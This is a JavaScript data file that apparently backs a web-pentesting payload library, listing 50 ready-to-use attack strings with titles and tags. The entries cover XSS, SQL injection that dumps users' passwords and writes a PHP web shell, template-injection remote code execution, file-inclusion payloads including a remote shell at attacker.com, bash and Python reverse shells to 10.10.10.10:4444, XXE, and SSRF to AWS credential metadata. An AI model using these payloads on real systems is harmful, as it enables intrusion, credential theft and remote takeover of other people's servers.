// Payload Library Data - 50+ Core Payloads (Foundation for 150+)
const payloadLibrary = [
    // XSS Payloads (10)
    { id: 1, title: 'Basic XSS Alert', category: 'xss', difficulty: 'easy', description: 'Simple XSS payload to test for basic cross-site scripting vulnerabilities', payload: '<script>alert("XSS")</script>', tags: ['basic', 'alert', 'script'] },
    { id: 2, title: 'Image Tag XSS', category: 'xss', difficulty: 'easy', description: 'XSS using img tag with onerror event handler', payload: '<img src=x onerror=alert("XSS")>', tags: ['img', 'onerror', 'tag'] },
    { id: 3, title: 'SVG XSS', category: 'xss', difficulty: 'medium', description: 'XSS using SVG with onload event', payload: '<svg onload=alert("XSS")>', tags: ['svg', 'onload', 'tag'] },
    { id: 4, title: 'Body Onload XSS', category: 'xss', difficulty: 'easy', description: 'XSS using body tag with onload attribute', payload: '<body onload=alert("XSS")>', tags: ['body', 'onload', 'attribute'] },
    { id: 5, title: 'Input Autofocus XSS', category: 'xss', difficulty: 'medium', description: 'XSS using input field with autofocus and onfocus', payload: '<input autofocus onfocus=alert("XSS")>', tags: ['input', 'autofocus', 'onfocus'] },
    { id: 6, title: 'Iframe XSS', category: 'xss', difficulty: 'medium', description: 'XSS using iframe with javascript protocol', payload: '<iframe src="javascript:alert("XSS")">',tags: ['iframe', 'javascript', 'protocol'] },
    { id: 7, title: 'JavaScript Protocol XSS', category: 'xss', difficulty: 'easy', description: 'XSS using javascript protocol in anchor tag', payload: '<a href="javascript:alert("XSS")">Click</a>', tags: ['anchor', 'javascript', 'protocol'] },
    { id: 8, title: 'Filter Bypass - No Parentheses', category: 'xss', difficulty: 'hard', description: 'XSS bypass when parentheses are filtered', payload: '<svg><animate onbegin=alertXSS attributeName=x dur=1s>', tags: ['bypass', 'svg', 'animate'] },
    { id: 9, title: 'Filter Bypass - No Quotes', category: 'xss', difficulty: 'hard', description: 'XSS bypass without using quotes', payload: '<img src=x onerror=alert(String.fromCharCode(88,83,83))>', tags: ['bypass', 'fromCharCode', 'encoding'] },
    { id: 10, title: 'XSS - Polyglot', category: 'xss', difficulty: 'hard', description: 'Universal XSS payload that works in multiple contexts', payload: String.raw`jaVasCript:/*-/*/*\/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//\x3e`, tags: ['polyglot', 'universal', 'advanced'] },
    
    // SQLi Payloads (10)
    { id: 11, title: 'Basic OR SQLi', category: 'sqli', difficulty: 'easy', description: 'Simple SQL injection to bypass authentication', payload: "' OR '1'='1", tags: ['auth-bypass', 'or', 'boolean'] },
    { id: 12, title: 'Comment-Based SQLi', category: 'sqli', difficulty: 'easy', description: 'SQL injection using comment to ignore rest of query', payload: 'admin"--', tags: ['comment', 'auth-bypass', 'mysql'] },
    { id: 13, title: 'UNION SELECT - Column Discovery', category: 'sqli', difficulty: 'medium', description: 'UNION-based SQL injection to discover number of columns', payload: "' UNION SELECT NULL,NULL,NULL--", tags: ['union', 'discovery', 'columns'] },
    { id: 14, title: 'UNION SELECT - Data Extraction', category: 'sqli', difficulty: 'medium', description: 'Extract database information using UNION', payload: "' UNION SELECT username,password,NULL FROM users--", tags: ['union', 'extraction', 'users'] },
    { id: 15, title: 'Time-Based Blind SQLi - MySQL', category: 'sqli', difficulty: 'hard', description: 'Time-based blind SQL injection for MySQL', payload: "' AND SLEEP(5)--", tags: ['blind', 'time-based', 'mysql'] },
    { id: 16, title: 'Boolean-Based Blind SQLi', category: 'sqli', difficulty: 'hard', description: 'Boolean-based blind SQL injection', payload: "' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--", tags: ['blind', 'boolean', 'substring'] },
    { id: 17, title: 'Error-Based SQLi - MySQL', category: 'sqli', difficulty: 'medium', description: 'Extract data via MySQL error messages', payload: "' AND extractvalue(1,concat(0x7e,(SELECT @@version),0x7e))--", tags: ['error-based', 'extractvalue', 'mysql'] },
    { id: 18, title: 'Database Version - MySQL', category: 'sqli', difficulty: 'easy', description: 'Retrieve MySQL database version', payload: "' UNION SELECT @@version,NULL,NULL--", tags: ['version', 'mysql', 'recon'] },
    { id: 19, title: 'Database Names - MySQL', category: 'sqli', difficulty: 'medium', description: 'Enumerate all database names in MySQL', payload: "' UNION SELECT schema_name,NULL,NULL FROM information_schema.schemata--", tags: ['enumeration', 'databases', 'mysql'] },
    { id: 20, title: 'SQLi - MySQL INTO OUTFILE', category: 'sqli', difficulty: 'hard', description: 'Write web shell to file', payload: "' UNION SELECT '<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/shell.php'--", tags: ['mysql', 'outfile', 'webshell'] },
    
    // SSTI Payloads (10)
    { id: 21, title: 'Jinja2 Basic Test', category: 'ssti', difficulty: 'easy', description: 'Test for Jinja2 SSTI vulnerability', payload: '{{7*7}}', tags: ['jinja2', 'test', 'python'] },
    { id: 22, title: 'Jinja2 RCE - os.popen', category: 'ssti', difficulty: 'hard', description: 'Remote code execution via Jinja2 SSTI', payload: '{{config.__class__.__init__.__globals__["os"].popen("whoami").read()}}', tags: ['jinja2', 'rce', 'python'] },
    { id: 23, title: 'Jinja2 File Read', category: 'ssti', difficulty: 'hard', description: 'Read files using Jinja2 SSTI', payload: '{{"".__class__.__mro__[1].__subclasses__()[40]("/etc/passwd").read()}}', tags: ['jinja2', 'file-read', 'python'] },
    { id: 24, title: 'Twig SSTI Basic Test', category: 'ssti', difficulty: 'easy', description: 'Test for Twig SSTI vulnerability', payload: '{{7*"7"}}', tags: ['twig', 'test', 'php'] },
    { id: 25, title: 'Twig RCE', category: 'ssti', difficulty: 'hard', description: 'Remote code execution via Twig SSTI', payload: '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("whoami")}}', tags: ['twig', 'rce', 'php'] },
    { id: 26, title: 'Freemarker SSTI Test', category: 'ssti', difficulty: 'easy', description: 'Test for Freemarker SSTI vulnerability', payload: '${7*7}', tags: ['freemarker', 'test', 'java'] },
    { id: 27, title: 'Freemarker RCE', category: 'ssti', difficulty: 'hard', description: 'Remote code execution via Freemarker SSTI', payload: '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("whoami")}', tags: ['freemarker', 'rce', 'java'] },
    { id: 28, title: 'Smarty SSTI RCE', category: 'ssti', difficulty: 'hard', description: 'Remote code execution via Smarty SSTI', payload: '{system("whoami")}', tags: ['smarty', 'rce', 'php'] },
    { id: 29, title: 'Flask/Jinja2 Config Access', category: 'ssti', difficulty: 'hard', description: 'Access Flask configuration', payload: '{{config.items()}}', tags: ['flask', 'config', 'disclosure'] },
    { id: 30, title: 'Django Debug Mode', category: 'ssti', difficulty: 'hard', description: 'Access Django settings', payload: '{{settings.SECRET_KEY}}', tags: ['django', 'settings', 'disclosure'] },
    
    // LFI/RFI Payloads (10)
    { id: 31, title: 'Basic LFI - /etc/passwd', category: 'lfi', difficulty: 'easy', description: 'Read /etc/passwd using directory traversal', payload: '../../../../etc/passwd', tags: ['traversal', 'linux', 'basic'] },
    { id: 32, title: 'Windows LFI - win.ini', category: 'lfi', difficulty: 'easy', description: 'Read win.ini on Windows systems', payload: String.raw`..\..\..\..\windows\win.ini`, tags: ['traversal', 'windows', 'basic'] },
    { id: 33, title: 'PHP Wrapper - Base64 Encode', category: 'lfi', difficulty: 'medium', description: 'Read PHP source code using base64 wrapper', payload: 'php://filter/convert.base64-encode/resource=index.php', tags: ['php-wrapper', 'base64', 'source-code'] },
    { id: 34, title: 'PHP Wrapper - Input Stream', category: 'lfi', difficulty: 'hard', description: 'Execute PHP code via input stream', payload: 'php://input', tags: ['php-wrapper', 'input', 'rce'] },
    { id: 35, title: 'Null Byte LFI Bypass', category: 'lfi', difficulty: 'medium', description: 'Bypass file extension filtering with null byte', payload: '../../../../etc/passwd%00', tags: ['bypass', 'null-byte', 'linux'] },
    { id: 36, title: 'Double Encoding Bypass', category: 'lfi', difficulty: 'medium', description: 'Bypass filters using double URL encoding', payload: '..%252f..%252f..%252fetc%252fpasswd', tags: ['bypass', 'encoding', 'filter'] },
    { id: 37, title: 'Log Poisoning - Apache', category: 'lfi', difficulty: 'hard', description: 'Poison Apache logs to achieve RCE', payload: '../../../../var/log/apache2/access.log', tags: ['log-poisoning', 'rce', 'apache'] },
    { id: 38, title: 'Expect Wrapper RCE', category: 'lfi', difficulty: 'hard', description: 'Execute commands using expect wrapper', payload: 'expect://whoami', tags: ['expect', 'rce', 'php-wrapper'] },
    { id: 39, title: 'Data URI Wrapper', category: 'lfi', difficulty: 'medium', description: 'Execute code using data URI wrapper', payload: 'data://text/plain,<?php system($_GET["cmd"]); ?>', tags: ['data-uri', 'php', 'rce'] },
    { id: 40, title: 'RFI - Remote Shell', category: 'lfi', difficulty: 'hard', description: 'Include remote PHP shell', payload: 'http://attacker.com/shell.txt', tags: ['rfi', 'remote', 'shell'] },
    
    // Command Injection Payloads (5)
    { id: 41, title: 'Basic Command Chaining - Semicolon', category: 'cmdi', difficulty: 'easy', description: 'Execute multiple commands using semicolon', payload: '; whoami', tags: ['chaining', 'semicolon', 'basic'] },
    { id: 42, title: 'Command Chaining - Ampersand', category: 'cmdi', difficulty: 'easy', description: 'Execute commands using double ampersand', payload: '& whoami &', tags: ['chaining', 'ampersand', 'basic'] },
    { id: 43, title: 'Command Chaining - Pipe', category: 'cmdi', difficulty: 'easy', description: 'Pipe output to another command', payload: '| whoami', tags: ['chaining', 'pipe', 'basic'] },
    { id: 44, title: 'Reverse Shell - Bash', category: 'cmdi', difficulty: 'hard', description: 'Spawn reverse shell using bash', payload: 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1', tags: ['reverse-shell', 'bash', 'tcp'] },
    { id: 45, title: 'Reverse Shell - Python', category: 'cmdi', difficulty: 'hard', description: 'Spawn reverse shell using python', payload: `python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])"`, tags: ['reverse-shell', 'python', 'tcp'] },
    
    // XXE Payloads (2)
    { id: 46, title: 'Basic XXE - File Read', category: 'xxe', difficulty: 'medium', description: 'Read local files using XML External Entity injection', payload: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>', tags: ['file-read', 'dtd', 'basic'] },
    { id: 47, title: 'XXE - SSRF via XXE', category: 'xxe', difficulty: 'hard', description: 'Server-Side Request Forgery through XXE', payload: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://localhost:8080/admin">]><foo>&xxe;</foo>', tags: ['ssrf', 'internal', 'localhost'] },
    
    // SSRF Payloads (2)
    { id: 48, title: 'SSRF - localhost Access', category: 'ssrf', difficulty: 'easy', description: 'Access internal services via localhost', payload: 'http://localhost:8080/admin', tags: ['localhost', 'internal', 'basic'] },
    { id: 49, title: 'SSRF - Cloud Metadata AWS', category: 'ssrf', difficulty: 'hard', description: 'Access AWS EC2 instance metadata', payload: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/', tags: ['aws', 'metadata', 'cloud'] },
    
    // WAF Bypass Payloads (1)
    { id: 50, title: 'WAF Bypass - Mixed Case', category: 'bypass', difficulty: 'easy', description: 'Bypass filters using mixed case characters', payload: '<ScRiPt>alert(1)</sCrIpT>', tags: ['case', 'xss', 'simple'] }
];
